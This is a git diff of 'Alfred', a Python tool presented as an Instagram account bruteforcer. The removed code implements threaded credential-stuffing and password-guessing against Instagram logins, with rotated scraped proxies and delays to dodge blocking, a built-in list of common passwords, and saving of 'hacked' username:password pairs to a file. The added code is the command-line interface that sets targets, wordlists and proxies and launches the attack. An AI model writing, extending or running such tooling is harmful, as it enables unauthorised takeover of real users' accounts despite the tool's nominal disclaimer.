@@ -1,271 +1,264 @@
-# Instagram bruterforcer main file
-from login import *
+# The Main CLI Interface For Alfred
+from alfred import *
+import sys
 from misc import *
-from threading import Thread, Lock, active_count
-from os import getcwd, path, name, system
+import time
 import os
-from time import time, sleep
-from colorama import init
-from datetime import datetime
-import proxyscrape
-import subprocess
 
-class Alfred:
-    def __init__(self):
-        if os.name not in ['posix', 'nt']:
-            error("Error: May not run properly on os other than GNU Linux or Windows")
-        self.slash = "\\" if os.name == 'nt' else "/"
-        self.print_lock = Lock()
-        self.combos = []
-        self.current_threads = []
-        self.run = True
-        self.divider = ":"
-        self.combolist_path = ""
-        self.write_path = str(getcwd()) + self.slash + "hacked_accounts.txt"
-        self.verbose = True
-        self.ready = False
-        self.store_password = True
-        self.single_user = None
-        self.prompt = False
-        self.hacked_count = 0
-        self.c = 0
-        self.attack_mode = 'combo'
-        self.single_pwds = ['password', 'Password1', '1234567890', '12345', 'Password', 'soccer', 'football', 'S@suke', '666666',
-                        'dragon', 'P@ssword', "Passw0rd1", '696969', 'Instagr@m1', 'jordan', 'ronaldo', '11111111', 'P@ssword1', 'iloveyou', 'chocolate']
-        self.proxy_file = None
-        self.proxy_list = []
-        self.proxy_location = None
-        self.delay_time = 0.5
-        self.config_data = read_config()
-        self.sleep = lambda: sleep(self.delay_time)
+github_link = "https://github.com/alfred-python/Alfred"
+youtube_link = "https://youtube.com/channel/UC2lNV87coLMar73mVK8uKGg"
 
-        # Run functions, check user ageement
-        init()  # init colorama, for coloured text
-        if not self.config_data['agree']:
-            error("""          !Notice!
-- Alfred must not be used for any unathaurized hacking of instagram accounts
-- By using alfred innapropriately you are liable to laws in your specific area, and instagram policies/user agreements/terms and conditions
-- I am not to be held liable nor responsible for innapropriate use of Alfred
-- To use alfred you must agree to the above terms, which are subject to change""")
+# Print the alfed banner/logo
+def show_banner(show_face=True):
+    if show_face:
+        print("""                                                                                      
+                                      CaqCrrJwhhQ<                                                       
+                                   df!i!!!!iliil||/(ho.                                                  
+                                .al!ii!!!!!!!!!!i!|||//zh.                                               
+                              .biii!!!!!!!!!!!!!!!!!(((|()k, .                                           
+                             ,dl!!!!!!!!!!!!!!!!!!!!!(|(((|1a                                            
+                           .+f!!!!!!!!!!!!!!!!!!!!!!!!(((((((0?.                                         
+                           `v!!!!!!!!!!!!!!i!!!!!!!!!!~(((((((|Z                                         
+                           k!!!!!!!!!!!!!!!!!!!!!!!!!!!(((((((()p                                        
+                          r!!!!!!!!!!!!!!!!n!!!!!!!!!!!(((((((((/C                                       
+                          ki!!!!!!!!!!!!!!i!u!!!!!!!!!-(((|()(((|h.                                      
+                         !/!!!!!!!!!!!!!!i!iJl!!t0moahwn)||((a)(|/v                                      
+                     d Z.Ll!!!!!!!!ii!irdhaOxxl!<l!!>il(((((((((((h                                      
+                   "q aq(hli!!!!!!ii!!!!!!!!iai!!bl!!!!kkhhhr)(|((a#  ~q`    .                           
+                   ..o~`.hli!!!!!!ih<!!![nnr]Q?Xkbhdqa((((((()Q|((h k,a1 jkn^                            
+               >JmkhY O Jhli!!!!!!i!!!!l!iiii!0>!lp!i?(|((((((((((hC,'k`k v^                             
+                  w   k *Oli!!!!Ji!!!!!!!!!!!!L>!it_!iC(((((((((((/a.k h`Q z                             
+               h !   U;^a-Z!!!!!lm/!!!!!!!!!!!!b!iiU-i!m((((((((0|((h`k| h."                             
+               v '. ." ho h!i!!!!!l|k1i!i!!!!!i!ai>+{x!a(((((((h(((|q .     ?hkv                         
+               `> ;0 l  k k!i!!!!iiiiiICaI!!!!!i>?i)<alo((((()z|()||)    <b{(b)Y^                        
+              o' `   )  d,/[!!!!!!!i!_klk;f!!!Qi|+k>q(|xkkkkkp((()k Ik)|hf(|)k                        
+               U    h|  >j`v!!!Uhhhzkobkkrk :Ckkp}bqhban0_N` fdLbkhYa|(nd|((((b                        
+                   /..o` J??!!lliit   hkkbh'o(k)|aliaAiscool 0 b))wkq(|dY((((((|/                       
+                  .a    .da!!!![kmY{/      k)v)>!!!!!ilhbkf)`,z_h|))pL)bf(|((((()0                       
+                        'k!il+ikaiokc!ukb!Zh-iI:k_kil!!lk} (---]_ka(/a()((((((((fv                       
+          lo**pOv_"     `0i!!Zi-qlit(!ii|df :;;;;k!i!ii>ia,1vjz})f|(|Uv(((((((((h                        
+          0l!l<)z[il!_doal!!!ii!ii!ii!||mbv ;I:;;a!!!!!<>!a--?]+k|((((d|((|(||(d,                        
+          _/(((((((((xt!!il!!!!!!!!!!!!!0k/;,X:;Z!!!i!!i|iikhbZ((((((babt(tqkkX                          
+         !_|((((((((((((({Oii!!!!!!!!!!iQi!khpaU~bi!!!!!{[!J|Q/(((((hd                                   
+         `Y)|((((((((((((((uwii!!!!!!!!iZ!<bl!!!!!~!!!!!1(iq((a((()kU                                    
+           .p(1|(((((((((|(||0w!!i!!!!!i0ia!Z?ll!!!!!!!i|{!h(|h(((pU                                     
+              qr((((|(/wQ[I'`!l!h{ii!!!iJ!i!ilpOliii!!!>(!!h(k)((|k+                                     
+                 "+,           +liCL!!!ij!i!!!iiiZh_i!!--!vZb|((a(uQ                                     
+                                +!i>k>l!tli!i!!!!!!!!+h~!!h({|(|)j)w>>>aO.                               
+                                 (!i!!!i{i!!iiii!!!ii!!i}<i!{|((aa/U<>>>>ca                              
+                                  bi!!i!]<!InlYIx!i>i!Jdakt>ll~/ObQ1,::>>>~aJ                            
+                                   Jli!!>-!!!kipxhhk}!</|(]iiii((((vh:,l>>>>ik                           
+                                   .I-!!!1l!ilbbkdi!||_i!!(i1>z|(((|)Q::>>>>i>k;dz                       
+                                 "Z,I,m>!)<bhkkz!!!!!!!!>)Cjh{p((((|(d::;>>>>>>kI .coZ                   
+                                 h:::,,ai(i!!hlii!!!!!_(()(1{!1(((((|h,::>>>>>>:a                        
+                                 h:::::I(ci!!i!!!!!!!+>!!i!!!!!i(|(|fQ;::>>>>>>i                         
+                                 p,:::::,k!ii!!!!!!!!!!!!!!!!!!!>(((h,:;l>>>>>ii                         
+                                :~,:::::,ka!!!!!!!!!!!!!!!!!!!!!i|(h;:::>>>>>><{                         
+                                O,:::::::a:,k!iii!!!!!!!!!!!!!!!!|Uu:::;<>>>>>>>`                        
+                                h::::::::k::,,au!i!!!!!!!!!!!!!!!qv[dJaO<>>>>>>--                        
+                             a" p::::::::X::::::}k}!iiiii!!!!!rk_rb a 1_ a|i>>>+?                        
+                            a   -x:::::::/,:::::;:,,bhkhhkh*n.0hd .a o'uz. k>>>1]                        
+                           k      k,:::::<"::::::::;::,,ak}h ), 1^ .p.o  p< a>i0'                        
+                                   d+,;::l,::::::::,,hbb L ^' b  O. w  kk"   dck                         
+                                    ^*I,:,+::::::::,k ha  [ C. k  d, k`       d1                         
+                                      Yv:;L;:::::::hh.o.~.o Z. O<!a+                                     
+                                        q(h;:::::::k I/Z^ b;nkk_+.                                       
+                                         .hb:^::::,*   '                                                 
+                                          m ,a-":;:a                                                     
+                                          (.   IU,:!1
+                                            """)
+    print(f"""
+                         ___  _  ___             _ 
+                        | . || || | '_ _  ___  _| |
+                        |   || || |-| '_>/ ._>/ . |
+                        |_|_||_||_| |_|  \___.\___|.py
+                    --> Python Instagram Account Bruteforcer
+                    --> Github: {github_link}
+                    --> Youtube: {youtube_link}
+    """)
 
-            if input('Do you agree to the above terms? (y/n)').lower() in ['yes', 'y', 'ye', 'agress']:
-                write_config('agree', True)
-                good('[AGREE] You Agreed to the terms, happy hacking!')
-                sleep(2)
-                clear_screen()
-            else:
-                error('Error: You Must Agree to the terms to use Alfred!', fatal=True)
+# Return input from the user and exit on a keybaord interrupt
+def get_answer():
+    try:
+        return input('[alf]>')
+    except KeyboardInterrupt:
+        error('\n[EXIT] Keyboard Interrupt Exiting...', fatal=True)
 
-    # Reset for another attack
-    def reset(self, full=False):
-        self.c = 0
-        self.current_threads.clear()
-        self.hacked_count = 0
-        if full:
-            self.combos, self.combolist_path = [], ""
-            self.proxy_file, self.proxy_list = None, []
-            self.single_user = None
-        if self.verbose and full:
-            print("Reset All Variables!")
+# Show Help
+def show_help():
+    print("\t\t--- Alfred Help ---")
+    print('set          Set <value> <variable>, change value of a variable eg, set verbose false')
+    print('options      Show the optional variables')
+    print("help         Show this help message")
+    print('proxies      Downloads Proxies for Alfred')
+    print('ready        Get alfred ready for an attack, ready proxies and passwords')
+    print('attack       Start the attack and get alfred ready if necessary')
+    print('clear        Clear the terminal screen')
+    print('reset        Reset variables to default')
+    print("banner       Show the epic Alfred banner")
 
-    # Print with threading.Lock
-    def lprint(self, msg, color=None):
-        with self.print_lock:
-            if color == "red":
-                error(msg)
-            elif color == "green":
-                good(msg)
-            else:
-                print(msg)
+# Show the current setting for Alfred
+def show_options(alfred):
+    print('\t\t[Options]')
+    if alfred.ready:
+        good("     ----> Alfred is Ready to Attack! <----")
+    else:
+        error("               ___Not Ready___")
+    print(f"Verbose (print verbose output?)                      ", end=""); show_bool(alfred.verbose)
+    print(f"Prompt  (Prompt before more tasks)                   ", end=""); show_bool(alfred.prompt)
+    print(f'Mode (attack mode; single/combo)                     {alfred.attack_mode}')
+    print(f"ProxyList (proxylist file path)                      ", end=""); show_bool(alfred.proxy_file)
+    print(f'ComboList (wordlist file path, NO SPACES)            ', end=""); show_bool(alfred.combolist_path)
+    print(f'User (username for single attack)                    {alfred.single_user}')
+    if alfred.combos != []:
+        print(f"Number Of Combos(length of  combos)                  {len(alfred.combos)}")
+    print(f"Store (Write hacked accounts to a file)              ", end=""); show_bool(alfred.store_password)
+    print(f"Delay (wait after login try to not get blocked)      {alfred.delay_time}")
+    if alfred.store_password:
+        print(f'StoreFile (File with hacked accounts)                {alfred.write_path}')
+
+# Evaluate a set answer
+def evaluate_answer_set(answer, alfred):
+    variable, value = answer.split(" ")[1].strip(), answer.split(" ")[2].strip()
+    # Set verbosity
+    if variable.lower() in ['verbose', 'verbosity', 'verb']:
+        if value not in ['True', 'true', 'false', 'False']:
+            error(f"Error, Value \'{value}\' is not a boolean!")
+        else:
+            alfred.verbose = eval(value.title())
+
+    elif variable.lower() in ['prompt', "check"]:
+        if value not in ['True', 'true', 'false', 'False']:
+            error(f"Error, Value \'{value}\' is not a boolean!")
+        else:
+            alfred.prompt = eval(value.title())
             
-    # read the password files and append to alfred.combos
-    def ready_passwords(self):
-        if self.attack_mode != 'single' and not path.isfile(self.combolist_path):  # no combolist and not single mode
-            error(f"[COMBOLIST] Error, combolist \'{self.combolist_path}\' not found!")
-            return
+    # Set delay time
+    elif variable.lower() in ['delay', 'sleep', 'delaytime']:
+        try:
+            float(value) + 1
+            if float(value) < 0:
+                error("Error: Delay Time cannot be < 0!")
+            alfred.delay_time = float(value.strip())
+        except ValueError:
+            error(f"Error: \'{value}\'is not a number!")
 
-        # Use top defauly wordlist if no passlist
-        if self.attack_mode == 'single' and self.combolist_path == "":
-            self.set_passwords_default()
-            return
+    # Set Attack Mode (single, combo)
+    elif variable.lower() in ['attackmode', 'mode', 'attack_mode']:
+        if value.lower() not in ['combo', 'single']:
+            error(f"Error, Attack Mode \'{value}\' not valid attack mode!")
         else:
-            try:
-                with open(self.combolist_path, "rt") as c:
-                    data = c.readlines()
-                    c.close()
-            except FileNotFoundError:
-                try:
-                    with open(str(__file__).replace("alfred.py", self.combolist_path), "rt") as c:
-                        data = c.readlines()
-                        c.close()
-                except FileNotFoundError:
-                    error("Error: Wordlist Not Found, try placing in the Alfred Directory")
-                    return
-        if self.attack_mode == 'single':
-            for line in data:
-                if line[0] != "#":
-                    self.combos.append([self.single_user, line.strip()])
-                    
-        elif self.attack_mode == "combo":
-            for line in data:
-                if line[0] != "#":
-                    spl = line.strip().split(self.divider)
-                    if len(spl) == 2:
-                        self.combos.append([spl[0], spl[1].strip()])
+            alfred.attack_mode = value       
+
+    # Set Proxy File
+    elif variable.lower() in ['proxies', 'proxy_list', 'proxylist', 'plist']:
+        alfred.proxy_file = value.replace("\"", "")
+        alfred.ready = False
+
+    # Set the Combolist/Wordlist
+    elif variable.lower() in ['combolist', 'combos', 'wordlist', 'passlist', 'passwordlist', 'clist', 'wlist']:
+        alfred.combolist_path =  value.replace("\"", "")
+        alfred.ready = False
+
+    # Set the file to write passwords to 
+    elif variable.lower() in ['storef', 'storefile']:
+        alfred.write_path = value
+
+    # Set the password list divider, in the case of a weird password list (username:password) where : is hte divider
+    elif variable.lower() in ['divider', 'password_divider']:
+        alfred.divider = value
+
+    # Set the user in the case of a singular username attack
+    elif variable.lower() in ['user', 'singleuser', 'single', 'single_user', 'single_username']:
+        alfred.single_user = value
+        alfred.ready = False
+
+    elif variable.lower() in ['store', 'storepassword', 'store_password']:
+        if value not in ['True', 'true', 'false', 'False']:
+            error(f"Error, Value \'{value}\' is not a boolean!")
         else:
-            error(f'[ATTACK MODE] Error, attack mode \'{self.attack_mode}\' not recognised')
+            alfred.store_password = eval(value.title())
+    # Default case
+    else:
+        error(f"Error: Set \'{answer.split(' ')[1]}\' not a variable!")
 
-    # Ready The proxy file to be used or download one
-    def ready_proxies(self):
-        if not self.proxy_file:
-            error('[PROXY ERROR] A Proxy File is required!')
-            if self.prompt:
-                if input('[PROXY] Download Proxies? (y/n)').strip() in ['y', 'ye', 'yes', 'yeah']:
-                    self.download_proxies(location=self.proxy_location)
-                else:
-                    error("Fatal Error: No proxylist!", fatal=True)
-            else:
-                self.download_proxies(location=self.proxy_location)
-        # Parse the proxy file
-        with open(self.proxy_file, "rt") as f:
-            data = f.readlines()
-            f.close()
-        for line in data:
-            if line[0] != "#":
-                self.proxy_list.append(line.strip())
+# Check the answer and run a funtion accordingly
+def evaluate_answer(answer, alfred):
+    if answer.strip() == "":
+        return
+    if answer in ['help', 'show help', 'show h']:
+        show_help()
+    elif answer in ['banner', 'show banner', 'show b']:
+        show_banner(show_face=alfred.config_data['show_face'])
+    elif answer in ['show options', 'settings', 'show settings', 'options', 'option']:
+        show_options(alfred)
 
+    # Download Proxies for alfred to use
+    elif answer.lower() in ['download_proxies', 'get_proxies', 'getproxies']:
+        alfred.download_proxies()
+    
     # Ready Alfred for an attack
-    def ready_attack(self):
-        if self.verbose:
-            print('Readying passwordlist and proxies...')
-        if self.combos == []:
-            self.ready_passwords()
-        self.ready_proxies()
-        self.ready = True
-        if self.verbose:
-            good("[READY] Combos and proxies are ready!")
+    elif answer.lower() in ['ready', 'ready_alfred', 'getready', 'get_ready']:
+        if alfred.ready:
+            print('[READY] Alfred is already ready!')
 
-    # Return a proxy from the list
-    def get_proxy(self, attack_no):
-        if attack_no <= len(self.proxy_list):
-            px = self.proxy_list[attack_no-1]
+        elif not alfred.single_user and alfred.combolist_path == "":
+            error("Error: Cannot Attack, no combolist specified!")
+        elif alfred.single_user and alfred.attack_mode != "single" and alfred.combolist_path == "":
+            error("Error: No Combolist specified, did you forget to set mode to single?")
+
+        elif not alfred.single_user and alfred.attack_mode == 'single':
+            error("Error: No user specified, cannot get ready!")
+        # Ready for a single attack if no wordlist
         else:
-            px = self.proxy_list[0]
-        return px
+            alfred.ready_attack()
 
-    # Download proxies 
-    def download_proxies(self, location=False):
-        collector = proxyscrape.create_collector('collector1', ['https', 'http']) 
-        proxies_raw = ""
-        if location:
-            collector.apply_filter({"country": location})
-        print("[DOWNLOAD] Downloading proxies...", end="")
-        for i in range(len(self.combos)):
-            a = collector.get_proxy() 
-            proxies_raw += str(a[0]) + ":" + str(a[1]) + "\n" 
-        print("done")
-        if self.verbose:
-            print(f"[WRITING] Writing proxies to {getcwd()}{self.slash}proxies.txt...", end="")
-        with open("proxies.txt", "w") as pfile:
-            pfile.write(proxies_raw)
-            pfile.close()
-        self.proxy_file = "proxies.txt"
-        if self.verbose:
-            print("done")
+    elif answer.strip() in ['attack', 'run', 'hack']:
+        if not alfred.single_user and alfred.combolist_path == "":
+            error("Error: Cannot Attack, no combolist or attack target username specified!")
 
-    # Stores credentials in a file
-    def write_pwd(self, username, password):
-        t = str(datetime.now())[:16]
-        with open(self.write_path, "at") as f:
-            f.write(f"{t}, {username}:{password}\n")
-            f.close()
-        if self.verbose:
-            print(f'[WROTE] Wrote account credentials to {self.write_path}!')
+        elif alfred.combolist_path == "" and alfred.attack_mode != 'single':
+            if alfred.prompt:
+                if input("Use single attack mode? (y/n)") in ['yes', 'ye', 'y']:
+                    alfred.attack_mode == "single"
+            else:
+                alfred.attack_mode = 'single'
+                print("[AUTO] Set mode to single!")
+            print(f"[PASSLIST] No passlist specified, using top {len(alfred.single_pwds)} passwords!")
+            for pwd in alfred.single_pwds:
+                alfred.combos.append([alfred.single_user, pwd])
+            alfred.go()
 
-    # Getting website requests and print the result
-    def hack_account(self, user, pwd, num):
-        proxy = self.get_proxy(num)
-        test = login_check(user.strip(), pwd.strip(), proxy)
-        if test == "yes":
-            self.lprint(f'[HACKED] {user}:{pwd.strip()} Successful account combo', color="green")
-            self.hacked_count += 1
-            if self.store_password:
-                self.write_pwd(user, pwd)
-        elif test == 'invalid_user':
-            self.lprint(f"Error: Invalid Username \'{user}\', Please try another username!")
-        elif test == 'maybe':
-            self.lprint(f'[HACKED] {user}:{pwd} VERIFICATION REQUIRED', color='green')
-            self.hacked_count += 1
-            if self.store_password:
-                self.write_pwd(user, pwd)
-        elif test == "wait":
-            if self.verbose:
-                self.lprint(f"Error: Cannot continue to attack {user}, temporary account login blocked!", color='red')
+        elif alfred.single_user and alfred.attack_mode != "single":
+            if alfred.prompt:
+                if input("Use single attack mode? (y/n)") in ['yes', 'ye', 'y']:
+                    alfred.attack_mode == "single"
+            else:
+                alfred.attack_mode = "single"
+                print("[AUTO] Set mode to single!")
         else:
-            if self.verbose:
-                self.lprint(f"[FAIL] failed {user}:{pwd.strip()}! {proxy}", color='red')
+            alfred.go()
 
-    # Set the wordlist to the top 20 passwords
-    def set_passwords_default(self):
-        self.combos.clear()
-        for pwd in self.single_pwds:
-            self.combos.append([self.single_user, pwd])
-        if self.verbose:
-            good(f'[PASSLIST] Set passwordlist to defualt top {len(self.single_pwds)}!')
-        
-    # Main attack function
-    def attack(self):
-        start, incremental_print_time = time(), time()
-        print(f'Starting {len(self.combos)} password attack threads...')
-        # make a thread for each password
-        for username, password in self.combos:
-            if not self.run:
-                break
-            t = Thread(target=self.hack_account, args=[username, password, self.c], daemon=False)
-            t.start()
-            self.current_threads.append(t)
-            self.c += 1
-            if self.delay_time > 0:
-                self.sleep()
-
-        # Wait for threads to die and print info after every 20 seconds
-        while active_count() > 1:
-            try:
-                if time() > incremental_print_time + 15:
-                    print(f'[STATS] Total Attempts: {self.c}     Hacked: {self.hacked_count}      Elapsed: {round(time() - start, 2)}s') 
-                    incremental_print_time += 20
-                    
-            except KeyboardInterrupt:
-                for th in self.current_threads:
-                    t.run = False
-                error("Keyboard Interrupt; Exiting...", fatal=True)
-            
-        print("[DONE] All Passwords have been attempted!")
-        el = round(time() - start, 2)
-        print(f"[STATS] Elapsed: {el} seconds")
-        print(f"[STATS] Total Attempts: {self.c}")
-        if self.hacked_count == 0:
-            error("[FAIL] No accounts hacked!")
+    # Set variables to values, by splitting answer
+    elif answer.split(" ")[0] == 'set':
+        if len(answer.split(" ")) < 3:
+            error('Error: Please specify more arguments for set, try: \'set <variable> <value>\'')
         else:
-            good(f'[HACKED] Hacked a total of {self.hacked_count} account(s)!')
-        self.reset()
+            evaluate_answer_set(answer, alfred)
 
-    # Start the attack with whatever function
-    def go(self):
-        self.run = True
-        if self.attack_mode == 'combo':
-            if not self.ready:
-                print("[READYING] Getting Alfred Ready...")
-                self.ready_attack()
-            print('[ATTACK STARTING] Starting combo mode attack')
-            self.attack()
-        elif self.attack_mode == 'single':
-            if not self.ready:
-                self.ready_attack()
-            if self.combolist_path == "":
-                self.set_passwords_default()
-                if not self.proxy_file:
-                    self.ready_proxies() 
-            self.attack()
-        else:
-            print('Invalid Attack Mode!')
+    elif answer in ['clear', 'cls']:
+        clear_screen()
+
+    elif answer in ['reset', 'fullreset']:
+        alfred.reset(full=True)
+    # Default to an error message on an invalid command
+    else:
+        error('Error: Command Not Recognised!')
+
+# Main code
+def main():
+    A = Alfred()
+    show_banner(show_face=A.config_data['show_face'])
+    while 1:
+        answer = get_answer()        
+        evaluate_answer(answer, A) 
